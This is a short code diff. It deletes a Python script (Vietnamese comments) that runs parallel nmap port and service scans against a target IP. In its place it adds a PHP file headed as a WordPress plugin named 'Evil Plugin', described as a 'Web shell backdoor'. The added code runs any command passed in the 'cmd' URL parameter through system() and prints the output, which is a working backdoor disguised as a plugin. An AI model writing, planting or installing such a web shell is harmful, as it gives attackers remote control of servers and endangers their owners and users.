@@ -1,32 +1,12 @@
-import subprocess
-from concurrent.futures import ThreadPoolExecutor
-import os
+<?php
+/*
+Plugin Name: Evil Plugin
+Description: Web shell backdoor
+*/
 
-# ⚙️ Cấu hình
-target_ip = "1.2.3.4"  # Đổi thành IP của bạn
-step = 1000            # Mỗi dải 1000 cổng
-output_dir = "nmap_results"
-
-# 📁 Tạo thư mục kết quả
-os.makedirs(output_dir, exist_ok=True)
-
-# 📦 Hàm quét 1 dải cổng
-def run_nmap(start_port, end_port):
-    output_file = os.path.join(output_dir, f"nmap_{start_port}_{end_port}.txt")
-    command = [
-        "nmap", "-sC", "-sV",
-        "-p", f"{start_port}-{end_port}",
-        target_ip,
-        "-oN", output_file
-    ]
-    print(f"[+] Scanning ports {start_port}-{end_port}")
-    subprocess.run(command, stdout=subprocess.DEVNULL)
-    print(f"[✓] Done ports {start_port}-{end_port}")
-
-# 🧵 Chạy song song
-with ThreadPoolExecutor(max_workers=10) as executor:  # Có thể chỉnh max_workers
-    for start in range(1, 65536, step):
-        end = min(start + step - 1, 65535)
-        executor.submit(run_nmap, start, end)
-
-print("🔥 All scans submitted.")
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
